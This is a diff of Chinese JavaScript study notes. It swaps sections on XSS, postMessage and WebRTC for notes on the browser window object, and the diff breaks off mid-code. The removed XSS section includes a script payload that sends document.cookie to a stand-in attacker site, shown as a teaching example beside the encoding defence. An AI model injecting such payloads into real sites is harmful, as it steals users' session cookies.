@@ -1,885 +1,1332 @@
-XSS'Cross SiteScript'跨站脚本攻击 
-  PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
-    理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
-  原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
-    当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
-    如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
-  DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
-    Example:
-      如一个获取他人Cookie的超链接,
-      'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
-      当点击这个链接的时候[假设点击者已经登录a.com],浏览器就会直接打开b.com,
-      并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
-      当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
-      cookie信息中可能存有登录密码,攻击成功！
-  Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
-    Example:
-      a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
-      <script>window.open(“www.b.com?param=”+document.cookie)</script>,
-      保存文章,这时当在查看攻击者的文章时就都中招了,
-      他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
-  XSS防御 
-    永远不相信用户的输入,输入验证
-    Html encode,对标签进行转换
-      比如输入:'<script>window.location.href=”http://www.baidu.com”;</script>',
-      最终存储的会是:
-      '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
-      在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码。
-XDM'cross-document messaging'跨文档消息传递 [HTML5][IE9+]  
-  PS: 可在不同域的页面间传递消息 
-  targetWin.postMessage(mes,url)  当前页向目标窗口传递数据 
-    PS: 目标窗口是指: 前页面中的<iframe>或由当前页打开的窗口
-    targetWin  目标窗口window对象  
-      如iframe的contentWindow属性、
-      执行 window.open 返回的窗口对象、
-      或者是命名过或数值索引的window.frames['name'] 
-    mes  any,发送的消息 
-      兼容性考虑,最好传递字符串,可使用JSON进行处理 
-    url  str,指定信息接收的域  
-      url指向的文档必须来源于指定的域,若匹配,消息会传递到框架中,否则无动作;
-      "*" 表示可以把消息发送给来自任何域的文档
-  targetWin.onmessage 事件 
-    PS: 接收到XDM消息时,会触发window对象的message事件 
-    e.data   
-    e.origin 
-    e.source 发送消息的文档的window对象的代理[访问不到window对象的其他信息] 
-      这个代理对象主要用于在发送上一条消息的窗口中调用postMessage()方法。
-      如果发送消息的窗口来自同一个域,那这个对象就是 window
-  Chrome只支持当前页向当前页发送消息 
-  Cross-document messaging 跨文档通信API
-    为window对象新增了一个 window.postMessage 方法,
-    允许跨窗口通信,不论这两个窗口是否同源。
-  
-    postMessage 父窗口 aaa.com 向子窗口 bbb.com 发消息
-      var popup = window.open('http://bbb.com', 'title');
-      popup.postMessage('Hello World!', 'http://bbb.com');
-      postMessage方法的第一个参数是具体的信息内容,
-      第二个参数是接收消息的窗口的源(origin),即“协议 + 域名 + 端口”。
-      也可以设为*,表示不限制域名,向所有窗口发送。
-      子窗口向父窗口发送消息的写法类似。
-      window.opener.postMessage('Nice to see you', 'http://aaa.com');
-    message事件 父窗口和子窗口监听对方的消息
-      window.addEventListener('message', function(e) {
-        console.log(e.data);
-      },false);
-      message事件的事件对象event,提供以下三个属性。
-      event.source:发送消息的窗口
-      event.origin: 消息发向的网址
-      event.data: 消息内容
-      下面的例子是,子窗口通过event.source属性引用父窗口,然后发送消息。
-      window.addEventListener('message', receiveMessage);
-      function receiveMessage(event) {
-        event.source.postMessage('Nice to see you!', '*');
-      }
-      首先,receiveMessage函数里面没有过滤信息的来源,任意网址发来的信息都会被处理。
-      其次,postMessage方法中指定的目标窗口的网址是一个星号,表示该信息可以向任意网址发送。
-      通常来说,这两种做法是不推荐的,因为不够安全,可能会被恶意利用。
-      event.origin 属性可以过滤不是发给本窗口的消息。
-      window.addEventListener('message', receiveMessage);
-      function receiveMessage(event) {
-        if (event.origin !== 'http://aaa.com') return;
-        if (event.data === 'Hello World') {
-          event.source.postMessage('Hello', event.origin);
+window,表示浏览器的一个实例,BOM的核心对象 
+  PS: 具有双重角色,既是JS访问浏览器的接口,又是ECMAScript规定的Global对象; 
+  全局作用域中声明的所有变量和函数,相当于window对象的属性和方法 [详见变量声明]  
+    var aoo = 1;
+    console.log(window.aoo); // 1 ,a就是window.a
+    console.log(delete aoo); // false,删除失败,不是真正的window的属性 
+    boo = 2; 
+    console.log(window.boo);
+    console.log(delete boo); // true 
+    console.log(boo); // 报错不存在,已被删除  
+  'frame'框架: 一个网页/窗口中可能包含多个框架,每个框架都有自己的window对象  
+    PS: 若网页包含框架,则每个框架都有自己的window对象[保存在frames集合中] 
+    window.frames 框架集,包含页面所有框架的window对象 
+    同时也是页面的window: console.log(frames===window); // true 
+    var frame = frames[idx]  通过下标获取框架的window[从0开始,从左至右,从上至下]  
+    var frame = frames[name] 通过框架的'name'属性获取框架的window  
+    frame.parent  框架的父框架,在没有框架的情况下,parent等于top
+    frame.self    当前框架自身 
+    frame.length  框架内的子框架数量 
+    frame.name    框架的名称 
+    window.top    最外层框架,即浏览器窗口window对象 
+    window.length  当前页面中框架的数量,等价于 window.frames.length 
+  窗口位置与尺寸 
+    返回值类型为num,单位px 
+    ◆浏览器位置
+    screenLeft/screenTop  num,浏览器窗口相对桌面屏幕 「DiBs」 
+      Firefox不支持 
+      IE窗口内边缘距屏幕的距离;
+      Chrome窗口外边缘距屏幕边缘的距离 
+    screenX/screenY       num,浏览器窗口相对桌面屏幕 「DiBs」 
+      Firefox全屏时值分别为 -8,-8 
+      IE9+,全屏时值分别为 -8,-8 
+    跨浏览器兼容方法: 
+      var lftPos=(typeof screenLeft=="number")?screenLeft:screenX;
+      var topPos=(typeof screenTop=="number")?screenTop:screenY;
+    moveTo(x,y)    将浏览器位置移动到x,y坐标 
+      PS: 不适用于框架,只能对最外层的window对象使用 
+      Chrome、Firefox中默认被禁用 
+    moveBy(x,y)    将浏览器位置向下移动xpx向右移动ypx 
+      PS: 不适用于框架,只能对最外层的window对象使用
+      Chrome、Firefox中默认被禁用 
+    ◆浏览器尺寸  
+    outerWidth/outerHeight num,浏览器窗口外侧宽/高 [IE9+] 
+      包含浏览器的工具栏、边框、滚动条
+    innerWidth/innerHeight num,浏览器显示窗口宽/高 [IE9+] 
+      不包含边框和工具栏等,但包含滚动条 
+    resizeTo(num1,num2) 将浏览器窗口调整为宽num1,高num2 
+      PS: 不适用于框架,只能对最外层的window对象使用
+      Chrome、Firefox中默认禁用的 
+    resizeBy(num1,num2) 缩放差值[正数为放大,负数为缩小] 
+      PS: 不适用于框架,只能对最外层的window对象使用;默认被浏览器禁用的 
+  窗口其他操作 
+    win = window.open([url][,target][,params][,bol])  导航或新建窗口 
+      PS: 若浏览器扩展或其他程序阻止弹出窗口,open()通常会报错 
+      url     可选,将要导航到的URL;
+        若省略这个参数,或者它的值是空字符串,那么窗口就不显示任何文档 
+      target  可选,打开窗口的位置 
+        '_blank'  新建窗口或标签[视浏览器而定],默认值 
+        '_self'   在当前框架中打开  
+        '_parent' 在当前框架的父框架内打开.若当前框架无父框架,等同于'_self' 
+        '_top'    在顶层框架中打开,在无框架页面中等同于'_self' 
+          不打开新新窗口的情况下会忽略第三个参数
+        frameName 命名的框架,不存在则相当于'_blank',并将其命名为改值 
+      params  可选,设置窗口参数,参数间逗号隔开 
+        PS: 字符串中不可出现空格
+        width=num   窗口宽度,不能小于100
+        height=num  窗口高度,不能小于100
+        top=num     窗口顶部距屏幕顶部的px值[不可为负]
+        left=num    窗口左端距屏幕左端的px值[不能是负值]
+        menubar=yes/no     菜单栏显示,默认为no
+        scrollbars=yes/no  滚动条显示,默认为no
+        toolbar=yes/no     工具栏显示,默认为no
+        status=yes/no      状态栏显示,默认为no
+        resizable=yes/no   能否拖动改变窗口大小,默认为no
+        scrollable=yes/no  能否滚动,默认为no 
+        location=yes/no    是否在显示地址栏
+          不同浏览器的默认值不同,操作方式也不同[可能隐藏,可能禁用]
+        fullscreen=yes/no  浏览器窗口是否最大化[仅限IE]
+        Example: 
+        一般在新标签中打开,若设置了参数属性,则会打开新窗口,因为窗口风格不同
+        open('https://www.baidu.com','frame1','width=300,height=300,top=100')
+      bol     在浏览器记录中,新页面是否取代当前页面 
+      win  新页面的window对象,若打开窗口失败则返回 null  
+        PS: 默认可用 moveTo、moveBy、resizeTo、resizeBy 等方法 
+        Example: 
+        var win1 = open('https://www.baidu.com','_blank');
+        win1.moveTo(0,0);  // 将新窗口移动到左上角 
+      Exp: 
+        当打开的窗口加载后才能获取到其DOM,且有同源限制  
+          var win1 = window.open("./aoo.html?v=3","_blank")
+          // var win1 = window.open("https://www.baidu.com","_blank") // 不同源 
+          // console.log(win1.document.body); // 获取不到实际的DOM 
+          win1.onload = function(){ // 若不同源则,win1对象不可用  
+            console.log(win1.document.body); 
+          }
+        微信中兼容性问题 
+          android: 不管窗口目标是是什么,始终在当前页面打开,
+          ios : 只有目标窗口为'_self'时才有效[不填写也不行],其他则该方法不生效;
+    window.opener  打开当网页的源网页window对象 [open()方法或超链接打开] 
+      PS: 在本地file协议下,大部分该对象属性不可用,需要在服务器上运行 
+      window.opener = null;  切断联系,表示在单独的进程中运行新标签页 
+        联系一旦切断就无法恢复了
+      Exp:  
+        当打开的新窗口在当前窗口显示[即 _self、_parent或_top等],
+        则 window.opener 表示为当前的窗口也就是新窗口而无法获取到原窗口
+        window.opener.document.querySelector(); 获取到父元素的DOM对象
+    window.close()   关闭打开的窗口或在打开的窗口中关闭自己  
+      不能关闭当前窗口 
+      window.close(); // Scripts may close only the windows that were opened by it 
+      关闭新打开的窗口 
+      var win1 = window.open("./a","_blank");
+      setTimeout(function(){
+        win1.close(); // 1s后关闭打开的窗口  
+      },1000)
+      在新打开的窗口中关闭自己  
+      var win1 = window.open("./aoo.html","_blank");
+      window.close(); // 在 aoo.html 中,关闭自己 
+    bol = window.closed    检测[打开的]窗口是否关闭 
+      PS: 当窗口关闭后,其窗口的引用仍然还在,可通过该属性来检测是否关闭 
+    window.defaultStatus   读写,底部状态栏默认显示
+      读写 浏览器底部状态栏默认显示值
+      defaultStatus="状态栏默认显示文本";
+    window.status          底部状态栏条件显示的值
+      浏览器在某种条件下显示的值,当条件不成立时则不显示.
+      描述由用户交互导致的状态栏的临时消息
+      status="状态栏文本";
+    window.scroll(x,y)   滚动到 
+      x 值表示你想要置于左上角的px点的横坐标
+      y 值表示你想要置于左上角的px点的纵坐标
+    window.scrollTo(x,y) 同scroll
+    window.scrollBy(x,y) 滚动距离 
+      PS:要使此方法工作 window 滚动条的可见属性必须设置为true
+      x 把文档向右滚动的px数
+      y 把文档向下滚动的px数
+    num = window.pageXOffset 页面水平滚动距离 
+    num = window.pageYOffset 页面垂直滚动距离 
+    window.matchMedia(str); 返回一个MediaQueryList对象 
+      PS:若window.matchMedia 无法解析参数,matches返回的总是false,而不是报错.
+      str 一个mediaQuery语句的字符串
+      window.matchMedia(str).media; 返回所查询的mediaQuery语句字符串.
+      window.matchMedia(str).matches; 布尔值,表示当前环境是否匹配查询语句
+      addListener() 若mediaQuery查询结果发生变化就触发
+        回调函数的参数是MediaQueryList对象
+        Example:
+        var mtmd = window.matchMedia("(max-width: 700px)");
+        mtmd.addListener(foo); // 指定回调函数
+        function foo(mtmd) { if(mtmd.matches) { } else { };}
+        mtmd.removeListener(foo); // 撤销回调函数
+      removeListener();
+      Example:
+        var result = window.matchMedia('(min-width: 600px)');
+        result.media //(min-width: 600px)
+        result.matches // true
+        根据mediaQuery是否匹配当前环境,执行不同的JavaScript代码.
+        var result = window.matchMedia('(max-width: 700px)');
+        if(result.matches) {
+          console.log('页面宽度小于等于700px');
         } else {
-          console.log(event.data);
+          console.log('页面宽度大于700px');
         }
-      }
-      通过 window.postMessage,读写其他窗口的 LocalStorage 
-        主窗口写入iframe子窗口的localStorage。
-        window.onmessage = function(e) {
-          if (e.origin !== 'http://bbb.com') {
-            return;
+    window.blur()        将焦点从窗口移除  
+    window.focus()       将焦点移至窗口    
+  延时调用&间时调用&动画调用API 
+    JS单线程异步执行的机制 
+      JS引擎只有一个线程,异步事件排队等待被执行,不会在同时执行两条命令 
+      setTimeout,实际执行的时间大于等于定时器设置的值 
+        被延时执行的代码会被从同步任务队列放置到异步执行队列,并开始计时
+        异步队列会在同步队列所有代码执行完,JS引擎空闲后,
+        在计时结束时,开始执行延时代码.
+        若异步队列在执行的时被阻塞了,那么它将会被推迟到下一个可能的执行点,
+        指定的时间间隔表示何时将定时器的代码添加到队列,而不是何时实际执行代码
+        Example:
+        console.log(1);
+        setTimeout(function() {console.log('a')}, 9);
+        setTimeout(function() {console.log('b')}, 3);
+        setTimeout(function() {console.log('c')}, 0);
+        var sum = 0;
+        for(var i = 0; i < 1000000; i ++) { sum += 1; }
+        console.log(sum);
+        setTimeout(function() {console.log('d');}, 0);
+        // 1 → 1000000 → c → b → d → a
+      setInterval,实际执行时间尽量接近指定值[可多可少]
+        依次向异步列队中添加延时调用,
+        每个延时调用分别计时,不会互相影响.
+        当只有第n个延时被阻塞且阻塞时间小于间隔时间,
+        则n-1 到 n 的间隔时间大于指定间隔时间, n 到 n+1 小于间隔时间.
+        当阻塞时间大于间隔时间,则前面的调用被抛弃且立即调用下次,
+        保证间时最接近指定值 
+        console.log(1)
+        var siId = setInterval(function() {
+          var date = new Date();
+          console.log(date.getMinutes() + ':' + date.getSeconds() + ':' + date.getMilliseconds());
+        }, 10);
+        var sum = 0;
+        for(var i = 0; i < 10000000; i ++) { sum += i; }
+        console.log(2);
+        // 清除定时器,避免卡死浏览器
+        setTimeout(function() { clearInterval(siId); }, 30);
+        运行结果
+        1
+        2
+        19:44:733
+        19:44:750
+        19:44:760
+        19:44:770
+    id = setTimeout(foo/str,num [,arg1,arg2...]) 指定时间后回调,返回一id值  
+      foo 回调函数 
+      str 字符串代码,有解析功能相当于eval
+        不推荐此种写法,容易出错,不易扩展,损失性能
+        setTimeout("alert('abc')",2000);  // 2秒后执行代码块
+      num 延时的时间,单位ms,默认为 0
+      arg 可选,传入回调函数的参数 
+        setTimeout(function(arg){
+          console.log(arguments); // ["abc", callee: ƒ, Symbol(Symbol.iterator): ƒ] 
+          console.log(arg);      // abc 
+        },1000,'abc')
+    clearTimeout(id) 通过返回id值解除延时调用 
+      Example:
+      var aoo=setTimeout(function(){ alert("abc");},2000);
+      console.log(aoo);  // 50500,延时调用的id值
+      clearTimeout(aoo); // 取消调用
+      等价于
+      clearTimeout(50500);
+      但此种写法可能存在问题,因为id值可能会变,非一直为定值
+    id = setInterval(foo/str,num [,arg1,arg2...]) 每隔指定时间回调,返回一id值  
+      foo 回调函数 
+      str 字符串代码,有解析功能相当于eval
+      num 间隔时间,单位ms 
+      arg 可选,传入回调函数的参数 
+    clearInterval(id) 通过返回id值解除间时调用 
+      Example:
+      var box=setInterval(function(){ alert("abc"); },1000);
+      clearInterval(box); // 取消调用
+      console.log(box);   // 1518 ,虽然已取消调用 但box值仍存在
+    使用'setTimeout'仿造'setInterval' 
+      在开发环境下,很少使用真正的间歇调用,后一个间歇调用可能会在前一个间歇调用结束之前启动
+      Example:
+      使用超时调用设置定时器
+      <div id="a"></div>
+      <script>
+        var num =0;
+        var max =5;
+        function box(){
+          num++;
+          document.getElementById('a').innerHTML +=num;
+          if(num ==max){
+            alert('5秒到了!');
+          }else{
+            setTimeout(box,1000);
           }
-          var payload = JSON.parse(e.data);
-          localStorage.setItem(payload.key, JSON.stringify(payload.data));
-        };
-        上面代码中,子窗口将父窗口发来的消息,写入自己的LocalStorage。
-        
-        父窗口发送消息的代码如下。
-        
-        var win = document.getElementsByTagName('iframe')[0].contentWindow;
-        var obj = { name: 'Jack' };
-        win.postMessage(JSON.stringify({key: 'storage', data: obj}), 'http://bbb.com');
-        加强版的子窗口接收消息的代码如下。
-        window.onmessage = function(e) {
-          if (e.origin !== 'http://bbb.com') return;
-          var payload = JSON.parse(e.data);
-          switch (payload.method) {
-            case 'set':
-              localStorage.setItem(payload.key, JSON.stringify(payload.data));
-              break;
-            case 'get':
-              var parent = window.parent;
-              var data = localStorage.getItem(payload.key);
-              parent.postMessage(data, 'http://aaa.com');
-              break;
-            case 'remove':
-              localStorage.removeItem(payload.key);
-              break;
+        }
+        box();
+      </script>
+    id = requestAnimationFrame(foo) 浏览器专门为动画提供的API 
+      原理同setTimeout类似; 
+      通过递归调用同一方法来不断更新画面以达到动起来的效果,
+      浏览器会自动优化方法的调用,如页面非激活状态下,动画会自动暂停,节省了CPU开销
+      常用操作: 在函数体内使用 requestAnimationFrame 来调用该函数来实现效果 
+      Example: 
+      var n = 0;
+      !function(){
+        if (n<99) {
+          ++n;
+          requestAnimationFrame(arguments.callee)
+          console.log(n);
+        }
+      }();
+    cancelAnimationFrame(id)   通过返回ID值取消动画 
+  系统对话框: 其外观由操作系统或浏览器决定 
+    显示alert、confirm、prompt对话框时代码会停止执行,关掉后再恢复执行 
+    alert(str)    提示对话框  
+      显示对话框的时候代码会停止执行,关掉后恢复
+    confirm(str)  bol,用户确认对话框,确定返回'true',取消返回'false' 
+    prompt("提示文字","默认输入文字")  str,用户输入框对话框,返回输入字符或 null   
+      点击确定,返回用户输入值;点击取消,则返回 null 
+    print()    打印对话框,异步显示 
+    find(str)  网页字符查找,异步显示 [IE不支持] 
+  base64编码&解码 
+    btoa(btStr)  str,base64编码处理,返回base64字符串[HTML5 IE10+] 
+      btStr  二进制数据组成的Unicode字符串 
+    atob(bs64Str)  str,base64解码处理[HTML5 IE10+] 
+      PS:返回二进制数据组成的Unicode字符串
+        由于一些网络通讯协议的限制,必须使用该方法对原数据进行编码后,才能进行发送.
+        接收方使用相当于 window.atob 的方法对接受到的base64数据进行解码,得到原数据.
+        DOM Level 0 规范
+      bs64Str  经过base64编码后的字符串 
+      Example:
+        var encodedData = window.btoa("Hello, world"); // 编码 ,SGVsbG8sIHdvcmxk
+        var decodedData = window.atob(encodedData);    // 解码 ,Hello, world
+      Unicode 字符串 
+        在各浏览器中,使用 window.btoa 对Unicode字符串进行编码都会触发一个字符越界的异常.
+        先把Unicode字符串转换为UTF-8 编码,可以解决这个问题
+        function utf8_to_b64( str ) {
+          return window.btoa(unescape(encodeURIComponent( str )));
+        }
+        function b64_to_utf8( str ) {
+          return decodeURIComponent(escape(window.atob( str )));
+        }
+
+        // Usage:
+        utf8_to_b64('? à la mode');          // "4pyTIMOgIGxhIG1vZGU="
+        b64_to_utf8('4pyTIMOgIGxhIG1vZGU='); // "? à la mode"
+        在js引擎内部, encodeURIComponent(str) 相当于 escape(unicodeToUTF8(str)) 
+        所以可以推导出 unicodeToUTF8(str) 等同于 unescape(encodeURIComponent(str))
+    Example:
+        当服务器数据库中保存的是图片的二进制数据及图片文件的格式时,根据此二进制数据来渲染图片
+        <input type="file" id="file"/>
+        <input type="button" value="读取图像" onclick="readPicture()" id="btnReadPicture"/>
+        <div id="result"></div>
+        if(typeof FileReader == 'undefined') {
+          result.innerHTML = "抱歉,你的浏览器不支持FileReader";
+        }
+        function readPicture(){
+          // 检查是否为图像类型
+          var fileObj = document.getElementById("file").files[0];
+          if(!/image\/\w+/.test(fileObj.type)) {
+            alert("请确保文件类型为图像类型");
+            return false;
           }
-        };
-        加强版的父窗口发送消息代码如下。
+          var reader = new FileReader();
+          reader.readAsBinaryString(fileObj); // 将文件以二进制文件读入页面中
+          reader.onload = function(f){
+            var result = document.getElementById("result");
+            var src = "data:" + fileObj.type + ";base64," + window.btoa(this.result);
+            result.innerHTML = '<img src ="'+src+'"/>';
+          }
+        }
         
-        var win = document.getElementsByTagName('iframe')[0].contentWindow;
-        var obj = { name: 'Jack' };
-        // 存入对象
-        win.postMessage(JSON.stringify({key: 'storage', method: 'set', data: obj}), 'http://bbb.com');
-        // 读取对象
-        win.postMessage(JSON.stringify({key: 'storage', method: "get"}), "*");
-        window.onmessage = function(e) {
-          if (e.origin != 'http://aaa.com') return;
-          // "Jack"
-          console.log(JSON.parse(e.data).name);
-        };
-WebRTC'Web Real Time Communication'网络实时通信 [HTML5] 
-  PS: 最初是为了解决浏览器上视频通话而提出的,
-    即两个浏览器之间直接进行视频和音频的通信,不经过服务器。
-    后来发展到除了音频和视频,还可以传输文字和其他数据。
-    Google是WebRTC的主要支持者和开发者,它最初在Gmail上推出了视频聊天,
-    后来在2011年推出了Hangouts,允许在浏览器中打电话。推动了WebRTC标准的确立。
-  MediaStream,又称 getUserMedia  获取音频和视频 [HTML5]   
-    PS: navigator.getUserMedia  在浏览器中获取音频(通过麦克风)和视频(通过摄像头)
-      将来可以用于获取任意数据流,比如光盘和传感器
-    检查浏览器是否支持getUserMedia方法
-      PS:Chrome 21, Opera 18 和Firefox 17,支持该方法。
-        目前,IE还不支持,上面代码中的msGetUserMedia,只是为了确保将来的兼容。
-      navigator.getUserMedia  = navigator.getUserMedia ||
-      navigator.webkitGetUserMedia ||
-      navigator.mozGetUserMedia ||
-      navigator.msGetUserMedia;
-      if (navigator.getUserMedia) {
-        // 支持
+        使用canvas绘制一张图片后,点击上传
+        首先通过canvas元素的'toDataURL'方法获取该图片的url地址,
+        然后获取该URL地址中的base64格式的字符串,
+        最后使用atob方法将其解码为一串二进制数据,并将该二进制数据提交到服务器端
+        <input type="button" value="上传图片" onclick="imgSave()"/><br/>
+        <canvas id="canvas" width="400" height="300"></canvas>
+        var canvas;
+        function draw(id) {
+          canvas = document.getElementById(id);
+          var context = canvas.getContext('2d');
+          context.fillStyle = 'rgb(0,0,255)';
+          context.fillRect(0,0,canvas.width,canvas.height);
+          context.fillStyle = 'rgb(255,255,0)';
+          context.fillRect(10,20,50,50);
+        }
+        draw('canvas');
+        function imgSave(){
+          var data = canvas.toDataURL("image/png");
+          data = data.replace("data:image/png;base64,","");
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST","uploadImg.php");
+          xhr.send(window.atob(data));
+        }
+  ◆其他接口 
+  window.Notification   浏览器通知接口[DiBs HTML5] 
+    PS:用于在用户的桌面,而非网页上显示通知信息, 
+      桌面电脑和手机都适用,比如通知用户收到了一封Email。
+      具体的实现形式由浏览器自行部署,对于手机来说,一般显示在顶部的通知栏。
+      若网页代码调用这个API,浏览器会询问用户是否接受。
+      只有在用户同意的情况下,通知信息才会显示。
+    浏览器兼容性检测 
+      目前,Chrome和Firefox在桌面端部署了这个API,
+      Firefox和Blackberry在手机端部署了这个API; 
+      if (window.Notification) {
+        console.log('该浏览器支持Notification接口');
       } 
       else {
-        // 不支持
+        console.log('该浏览器不支持Notification接口');
       }
-    navigator.getUserMedia(obj,onSuccess,onError);
-      obj  对象,表示要获取哪些多媒体设备,
-        { 
-          video: true, 
-          audio: true 
-        } 
-        表示获取摄像头和麦克风;
-      onSuccess  回调函数,在获取多媒体设备成功时调用
-        函数的参数是一个数据流对象stream。
-        stream.getAudioTracks 方法和 stream.getVideoTracks 方法,
-        分别返回一个数组,其成员是数据流包含的音轨和视轨(track)。
-        使用的声音源和摄影头的数量,决定音轨和视轨的数量。
-        比如,若只使用一个摄像头获取视频,且不获取音频,那么视轨的数量为1,音轨的数量为0。
-        每个音轨和视轨,有一个kind属性,表示种类(video或者audio),
-        和一个label属性(比如FaceTime HD Camera (Built-in))。
-      onError    回调函数,在取多媒体设备失败时调用。
-        函数接受一个Error对象作为参数。
-        error.code.PERMISSION_DENIED    用户拒绝提供信息。
-        error.code.NOT_SUPPORTED_ERROR  浏览器不支持硬件设备。
-        error.code.MANDATORY_UNSATISFIED_ERROR 无法发现指定的硬件设备。
-      Example:
-        将摄像头拍摄的图像展示在网页上
-        <video src="" controls="" id="camera"> </video>
-        
-        var constraints = {video: true};
-        var vide = document.querySelector("#camera");
-        function onSuccess(stream) {
-          if (window.URL) {
-            vide.src = window.URL.createObjectURL(stream);
-          } 
-          else { 
-            vide.src = stream; 
-          }
-          vide.autoplay = true; 
-          // 或者 vide.play();
-        }
-        function onError(error) {
-          console.log("navigator.getUserMedia error: ", error);
-        }
-        if (navigator.getUserMedia) {
-          navigator.getUserMedia(constraints, onSuccess, onError);
-        } 
-        else {
-          vide.src = 'somevideo.mp4';
-        }
-        网页使用getUserMedia方法,浏览器就会询问用户,是否同意调用麦克风或摄像头;
-        若用户同意,就调用回调函数onSuccess；
-        若用户拒绝,就调用回调函数onError。
-        浏览器兼容性
-          Chrome中需使用https协议;
-          Firefox中需使用mozGetUserMedia;
-          vide.src
-            大部分浏览器:
-            URL.createObjectURL 方法将媒体数据流(MediaStream),
-            转为一个二进制对象的URL(Blob URL),
-            该URL可以作为video元素的src属性的值。 
-            有些浏览器:
-            媒体数据流可以直接作为src属性的值。
-    Canvas API  ctx.drawImage(video, 0, 0)  可将视频的一个帧转为canvas元素
-      PS:使得截屏变得非常容易。
-      <video autoplay></video>
-      <img src="">
-      <canvas style="display:none;"></canvas>
-      
-      <script>
-      var video = document.querySelector('video');
-      var canvas = document.querySelector('canvas');
-      var ctx = canvas.getContext('2d');
-      var localMediaStream = null;
-      function snapshot() {
-        if (localMediaStream) {
-          ctx.drawImage(video, 0, 0);
-          // “image/webp”对Chrome有效,其他浏览器自动降为image/png
-          document.querySelector('img').src = canvas.toDataURL('image/webp');
-        }
-      }
-      video.addEventListener('click', snapshot, false);
-      navigator.getUserMedia({video: true}, function(stream) {
-        video.src = window.URL.createObjectURL(stream);
-        localMediaStream = stream;
-      }, errorCallback);
-      </script>
-    Web Audio API  通过浏览器捕获声音
-      Example:
-        捕获麦克风声音
-        window.AudioContext = window.AudioContext || window.webkitAudioContext;
-        var context = new AudioContext();
-        function onSuccess(stream) {
-          var audioInput = context.createMediaStreamSource(stream);
-          audioInput.connect(context.destination);
-        }
-        navigator.getUserMedia({audio:true}, onSuccess);
-    捕获的限定条件
-      getUserMedia方法的第一个参数,除了指定捕获对象之外,还可以指定一些限制条件,
-      比如限定只能录制高清(或者VGA标准)的视频。
-      var hdConstraints = {
-        video: {
-          mandatory: {
-            minWidth: 1280,
-            minHeight: 720
-          }
-        }
-      };
-      navigator.getUserMedia(hdConstraints, onSuccess, onError);
-      
-      var vgaConstraints = {
-        video: {
-          mandatory: {
-            maxWidth: 640,
-            maxHeight: 360
-          }
-        }
-      };
-      navigator.getUserMedia(vgaConstraints, onSuccess, onError);
-    MediaStreamTrack.getSources() 使用指定的媒体设备
-      若本机有多个摄像头/麦克风,就需要使用 MediaStreamTrack.getSources 方法指定,
-      到底使用哪一个摄像头/麦克风。
-      function sourceSelected(audioSource, videoSource) {
-        var constraints = {
-          audio: {
-            optional: [{sourceId: audioSource}]
-          },
-          video: {
-            optional: [{sourceId: videoSource}]
-          }
-        };
-        navigator.getUserMedia(constraints, onSuccess, onError);
-      }
-      MediaStreamTrack.getSources(function(sourceInfos) {
-        var audioSource = null;
-        var videoSource = null;
-        for (var i = 0; i != sourceInfos.length; ++i) {
-          var sourceInfo = sourceInfos[i];
-          if (sourceInfo.kind === 'audio') {
-            console.log(sourceInfo.id, sourceInfo.label || 'microphone');
-            audioSource = sourceInfo.id;
-          } 
-          else if (sourceInfo.kind === 'video') {
-            console.log(sourceInfo.id, sourceInfo.label || 'camera');
-            videoSource = sourceInfo.id;
-          } 
-          else {
-            console.log('Some other kind of source: ', sourceInfo);
-          }
-        }
-        sourceSelected(audioSource, videoSource);
-      });
-      上面代码表示, MediaStreamTrack.getSources 方法的回调函数,
-      可以得到一个本机的摄像头和麦克风的列表,然后指定使用最后一个摄像头和麦克风。
-  RTCPeerConnection    进行音频和视频通信
-    作用是在浏览器之间建立数据的“点对点”(peer to peer)通信,
-    也就是将浏览器获取的麦克风或摄像头数据,传播给另一个浏览器。
-    这里面包含了很多复杂的工作,比如信号处理、多媒体编码/解码、
-    点对点通信、数据安全、带宽管理等等。
-    不同客户端之间的音频/视频传递,是不用通过服务器的。
-    但是,两个客户端之间建立联系,需要通过服务器。
-    服务器主要转递两种数据:
-      通信内容的元数据:
-        打开/关闭对话(session)的命令、
-        媒体文件的元数据(编码格式、媒体类型和带宽)等。
-      网络通信的元数据: IP地址、NAT网络地址翻译和防火墙等。
-    WebRTC协议没有规定与服务器的通信方式,因此可以采用各种方式, 比如WebSocket。
-    通过服务器,两个客户端按照Session Description Protocol(SDP协议)交换双方的元数据。
     Example:
-      var signalingChannel = createSignalingChannel();
-      var pc;
-      var configuration = ...;
-      // run start(true) to initiate a call
-      function start(isCaller) {
-        pc = new RTCPeerConnection(configuration);
-        
-        // send any ice candidates to the other peer
-        pc.onicecandidate = function (evt) {
-          signalingChannel.send(JSON.stringify({ "candidate": evt.candidate }));
-        };
-        
-        // once remote stream arrives, show it in the remote video element
-        pc.onaddstream = function (evt) {
-          remoteView.src = URL.createObjectURL(evt.stream);
-        };
-        
-        // get the local stream, show it in the local video element and send it
-        navigator.getUserMedia({ "audio": true, "video": true }, function (stream) {
-          selfView.src = URL.createObjectURL(stream);
-          pc.addStream(stream);
-          
-          if (isCaller)
-          pc.createOffer(gotDescription);
-          else
-          pc.createAnswer(pc.remoteDescription, gotDescription);
-          
-          function gotDescription(desc) {
-            pc.setLocalDescription(desc);
-            signalingChannel.send(JSON.stringify({ "sdp": desc }));
-          }
+      当前浏览器支持Notification对象,并当前用户准许使用该对象,
+      然后调用 Notification.requestPermission 方法,向用户弹出一条通知。
+      if(window.Notification && Notification.permission !== "denied") {
+        Notification.requestPermission(function(status) {
+          var n = new Notification('通知标题', { body: '这里是通知内容!'}); 
         });
       }
-      signalingChannel.onmessage = function (evt) {
-      if (!pc)
-      start(false);
-      
-      var signal = JSON.parse(evt.data);
-      if (signal.sdp)
